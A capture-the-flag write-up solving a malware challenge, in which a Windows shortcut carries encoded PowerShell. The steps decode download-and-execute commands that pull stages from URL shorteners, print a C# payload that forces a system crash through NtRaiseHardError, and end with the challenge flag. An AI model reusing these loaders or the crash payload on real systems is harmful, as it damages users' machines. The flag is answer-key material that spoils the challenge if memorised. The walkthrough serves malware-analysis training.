Name: Russian Roulette
Value: 440 points
Category: Malware
Solves: 111 Solves
Difficulty: Removed by the CTF Hosts
Author: @JohnHammond

Description:
My PowerShell has been acting really weird!! It takes a few seconds to start up, and sometimes it just crashes my computer!?!?! :(

WARNING: Please examine this challenge inside of a virtual machine for your own security. Upon invocation there is a real possibility that your VM may crash.

NOTE: Archive password is russian_roulette

Download the file(s) below.
Attachments: russian_roulette.zip

Solution:

1. Download and extract the attachment

┌──(kali㉿kali)-[~/CTF/huntress2024/malware/russian_roulette]
└─$ 7z x russian_roulette.zip -prussian_roulette

7-Zip 24.08 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-08-11
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 1156 bytes (2 KiB)

Extracting archive: russian_roulette.zip
--
Path = russian_roulette.zip
Type = zip
Physical Size = 1156

Everything is Ok

Size:       1852
Compressed: 1156

2. Verify that the .lnk (Windows Shortcut) is valid

┌──(kali㉿kali)-[~/CTF/huntress2024/malware/russian_roulette]
└─$ file Windows\ PowerShell.lnk 
Windows PowerShell.lnk: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Unicoded, MachineID windows11, EnableTargetMetadata KnownFolderID 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7, Archive, ctime=Sat Feb 17 02:44:00 2024, atime=Thu Oct  3 14:53:00 2024, mtime=Sat Feb 17 02:44:00 2024, length=450560, window=showminnoactive, IDListSize 0x020d, Root folder "20D04FE0-3AEA-1069-A2D8-08002B30309D", Volume "C:\", LocalBasePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

3. View the .lnk properties with lnkinfo

┌──(kali㉿kali)-[~/CTF/huntress2024/malware/russian_roulette]
└─$ lnkinfo Windows\ PowerShell.lnk
lnkinfo 20181227

Windows Shortcut information:
        Contains a link target identifier
        Contains a relative path string
        Contains a working directory string
        Contains a command line arguments string

Link information:
        Creation time                   : Feb 16, 2024 21:44:00.915218400 UTC
        Modification time               : Feb 16, 2024 21:44:00.915218400 UTC
        Access time                     : Oct 03, 2024 09:53:00.814243900 UTC
        File size                       : 450560 bytes
        Icon index                      : 0
        Show Window value               : 0x0006e000
        Hot Key value                   : 57344
        File attribute flags            : 0x00000020
                Should be archived (FILE_ATTRIBUTE_ARCHIVE)
        Drive type                      : Fixed (3)
        Drive serial number             : 0x7cea241e
        Volume label                    : 
        Local path                      : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Relative path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Working directory               : C:\Windows\system32
        Command line arguments          : -e aQB3AHIAIABpAHMALgBnAGQALwB6AGQANABoAFoAbgAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=

4. Note the base64 on the command line arguments, decode that to:

┌──(kali㉿kali)-[~/CTF/huntress2024/malware/russian_roulette]
└─$ echo -n "aQB3AHIAIABpAHMALgBnAGQALwB6AGQANABoAFoAbgAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=" | base64 -d
iwr is.gd/zd4hZn -o $env:TMP/.cmd;& $env:TMP/.cmd                                                                                                                                                                                                                                           
5. Curl the URL following the redirect

┌──(kali㉿kali)-[~/CTF/huntress2024/malware/russian_roulette]
└─$ curl -L is.gd/zd4hZn

Retreives a huge file with lots of Russian and encoding. It appears to be an obfuscated batch file. Pipe it to a file.

6. Before attempting to work with the file, upload to a sandbox to check for dynamic artifacts, I use https://www.tria.ge.

	a. Report: https://tria.ge/241003-2rzp2svbqa/behavioral1

		i. Analyzing the report we see multiple cmd.exe exit codes but most importantly
		   is this line: powershell  -e aQB3AHIAIABpAHMALgBnAGQALwBRAFIARAB5AGkAUAB8AGkAZQB4AA==		

7. Decode the newest base64 line to:

┌──(kali㉿kali)-[~/CTF/huntress2024/malware/russian_roulette]
└─$ echo -n "aQB3AHIAIABpAHMALgBnAGQALwBRAFIARAB5AGkAUAB8AGkAZQB4AA==" | base64 -d                                                                             
iwr is.gd/QRDyiP|iex   

8. Curl the URL again following the redirect

┌──(kali㉿kali)-[~/CTF/huntress2024/malware/russian_roulette]
└─$ curl -L is.gd/QRDyiP                    
$s='using System;using System.Text;using System.Security.Cryptography;using System.Runtime.InteropServices;using System.IO;public class X{[DllImport("ntdll.dll")]public static extern uint RtlAdjustPrivilege(int p,bool e,bool c,out bool o);[DllImport("ntdll.dll")]public static extern uint NtRaiseHardError(uint e,uint n,uint u,IntPtr p,uint v,out uint r);public static unsafe string Shot(){bool o;uint r;RtlAdjustPrivilege(19,true,false,out o);NtRaiseHardError(0xc0000022,0,0,IntPtr.Zero,6,out r);byte[]c=Convert.FromBase64String("RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw");byte[]k=Convert.FromBase64String("/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=");byte[]i=Convert.FromBase64String("9sXGmK4q9LdYFdOp4TSsQw==");using(Aes a=Aes.Create()){a.Key=k;a.IV=i;ICryptoTransform d=a.CreateDecryptor(a.Key,a.IV);using(var m=new MemoryStream(c))using(var y=new CryptoStream(m,d,CryptoStreamMode.Read))using(var s=new StreamReader(y)){return s.ReadToEnd();}}}}';$c=New-Object System.CodeDom.Compiler.CompilerParameters;$c.CompilerOptions='/unsafe';$a=Add-Type -TypeDefinition $s -Language CSharp -PassThru -CompilerParameters $c;if((Get-Random -Min 1 -Max 7) -eq 1){[X]::Shot()}Start-Process "powershell.exe" 

9. Clean up the output, I shameless used ChatGPT for this:

	a. https://chatgpt.com/share/66ff20af-2530-8009-90d0-71785d641fee
		i. Output Below:

			using System;
			using System.Text;
			using System.Security.Cryptography;
			using System.Runtime.InteropServices;
			using System.IO;

			public class X
			{
			    // Importing functions from ntdll.dll
			    [DllImport("ntdll.dll")]
			    public static extern uint RtlAdjustPrivilege(int privilege, bool enable, bool currentThread, out bool oldValue);
			    
			    [DllImport("ntdll.dll")]
			    public static extern uint NtRaiseHardError(uint errorStatus, uint numberOfParameters, uint unicodeStringParameter, IntPtr parameter, uint responseOption, out uint response);

			    // Method to decrypt and return a string
			    public static unsafe string Shot()
			    {
			        bool oldValue;
			        uint response;

			        // Adjusting privileges to enable the hard error raising
			        RtlAdjustPrivilege(19, true, false, out oldValue);
			        NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out response);
			        
			        // Base64 encoded data
			        byte[] encryptedData = Convert.FromBase64String("RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw");
			        byte[] key = Convert.FromBase64String("/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=");
			        byte[] iv = Convert.FromBase64String("9sXGmK4q9LdYFdOp4TSsQw==");

			        // Decrypting the data using AES
			        using (Aes aes = Aes.Create())
			        {
			            aes.Key = key;  // Set the key for decryption
			            aes.IV = iv;    // Set the initialization vector
			            
			            // Creating the decryptor
			            ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
			            
			            // Reading the decrypted data from the stream
			            using (var memoryStream = new MemoryStream(encryptedData))
			            using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
			            using (var streamReader = new StreamReader(cryptoStream))
			            {
			                return streamReader.ReadToEnd();  // Return the decrypted string
			            }
			        }
			    }
			}

			// Compiler parameters for dynamic code compilation
			var compilerParams = new System.CodeDom.Compiler.CompilerParameters();
			compilerParams.CompilerOptions = "/unsafe";

			// Adding the type and compiling it
			var assembly = Add-Type -TypeDefinition $s -Language CSharp -PassThru -CompilerParameters $compilerParams;

			// Randomly call the Shot method
			if ((Get-Random -Min 1 -Max 7) -eq 1)
			{
			    [X]::Shot();
			}

			// Start a new PowerShell process
			Start-Process "powershell.exe";

10. I decoded the base64 values for teh AES encryption, but realized too late that I didn't need to. I just needed to decode "encryptedData"

	Powershell:
	# Load the required .NET assemblies
	Add-Type -AssemblyName System.Security
	Add-Type -AssemblyName System.IO
	Add-Type -AssemblyName System.Security.Cryptography

	# Base64 encoded byte arrays
	$cipherText = [Convert]::FromBase64String("RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw")
	$key = [Convert]::FromBase64String("/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=")
	$iv = [Convert]::FromBase64String("9sXGmK4q9LdYFdOp4TSsQw==")

	# Create AES instance
	$aes = [System.Security.Cryptography.Aes]::Create()
	$aes.Key = $key
	$aes.IV = $iv
	$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC

	# Create decryptor
	$decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)

	# Decrypt the data
	$decryptedBytes = $decryptor.TransformFinalBlock($cipherText, 0, $cipherText.Length)

	# Convert decrypted bytes to string
	$decryptedFlag = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)

	# Output the decrypted flag
	Write-Output "Decrypted Flag: $decryptedFlag"

	Python:
	from Crypto.Cipher import AES
	import base64

	# Base64 encoded byte arrays
	cipher_text = base64.b64decode("RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw")
	key = base64.b64decode("/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=")
	iv = base64.b64decode("9sXGmK4q9LdYFdOp4TSsQw==")

	# Create AES cipher
	cipher = AES.new(key, AES.MODE_CBC, iv)
	decrypted = cipher.decrypt(cipher_text)

	# Remove padding (adjust if necessary based on padding used in encryption)
	decrypted_flag = decrypted.rstrip(b"\x00").decode('utf-8')  # Adjust padding as necessary
	print("Decrypted Flag:", decrypted_flag)

11. Run either script, and retrieve the flag.

		a. flag{4e4f266d44717ff3af8bd92d292b79ec}
